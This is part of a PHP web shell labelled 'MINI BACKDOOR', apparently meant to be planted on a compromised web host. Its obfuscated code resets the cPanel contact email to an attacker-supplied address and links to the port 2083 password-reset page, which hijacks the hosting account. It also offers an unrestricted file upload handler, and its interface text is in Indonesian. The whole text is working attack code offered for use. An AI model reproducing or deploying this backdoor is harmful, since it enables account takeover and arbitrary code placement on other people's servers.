...
select { background: white; color: black; border: 1px solid white; }
...
<h1>
<center>
<font color="#00FFFF"> <\> MINI BACKDOOR <\> </font>
</center>
</h1>
...
echo "<a href='?'> <font color='red'>[ HOME ] </a></font>";
echo'<header>
 <font color="blue"><h3>Auto Reset cPanel</h3></font>
</header> 
</center> 
<form action="#" method="post"> 	 <input type="email" name="email" placeholder="email@email.com" /> 	 <input type="submit" name="submit" value="Crack"/> 	 
</form> 	 	 
</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h3>Gak Support Cuy..</h3>
<br>
</pre>
</center>"; } else { echo "<center>Ini User Namenya...<br><br>
</center>"; echo '<center><h3><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br></h3></center>'; ;}}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">BERHASIL Cuy</font><br />';
}else{
echo '<font color="pink">GAGAL Cuy</font><br/>';
}
}
...
echo '<center><br/><font color="#00FFFF"> Recoded By <a href="https://cukimay-cyber-team.my.id/">Cukimay-Cyber-Team.my.id</a> </font></center>
</body>
</html>';
function perms($file){
